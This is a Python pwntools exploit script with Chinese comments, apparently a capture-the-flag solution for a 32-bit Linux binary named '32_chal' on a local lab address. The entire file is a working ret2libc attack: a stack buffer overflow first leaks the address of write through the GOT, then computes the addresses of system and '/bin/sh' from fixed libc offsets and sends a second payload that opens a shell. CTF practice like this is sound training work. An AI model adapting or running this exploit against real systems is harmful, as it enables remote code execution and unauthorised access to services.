#!/usr/bin/python
#coding:utf-8

from pwn import *

context.update(arch = 'i386', os = 'linux', timeout = 1)
io = remote('172.17.0.2', 10001)

elf = ELF('./32_chal')
write_got = elf.got['write']	#got表中write函数项所在内存地址，里面保存着write函数本体所在的内存地址
write_plt = elf.plt['write']	#plt表中write函数项所在的内存地址，该地址中保存的代码片段跳过call指令直接执行write函数代码
start_address = 0x08048380		#执行完write函数泄露write所在的内存地址后返回到start恢复堆栈环境

payload1 = "A"*112				#padding
payload1 += p32(write_plt)		#调用write(fd, buf, size)
payload1 += p32(start_address)	#模拟call指令压栈的返回地址，此时write函数执行完之后将会通过retn跳转到start
payload1 += p32(1)				#fd = 1，即stdout
payload1 += p32(write_got)		#buf = write_got，打印内存地址write_got中的内容，即write函数本体所在的内存地址
payload1 += p32(4)				#size = 4，打印的长度
io.send(payload1)
content = io.recv()
write_address = u32(content[-20:-16])		#程序执行了write()->read()->printf()->被我们劫持流程调用的write()->start->write()，我们需要的内容夹在输出中间，需要剪切字符串取出
log.info("Leak stack address = %x", write_address)

system_address = write_address - 0x9D3D0	#根据libc.so.6文件计算出的system函数与write函数的偏移值
binsh_address = write_address + 0x875DF		#根据libc.so.6文件计算出的"/bin/sh"字符串与write函数的偏移值

payload2 = "A"*112				#padding
payload2 += p32(system_address)	#调用system函数
payload2 += p32(0)				#模拟call指令压栈的返回地址，我们用system开完shell之后不用在意返回到哪里，所以随便填
payload2 += p32(binsh_address)	
io.send(payload2)

io.interactive()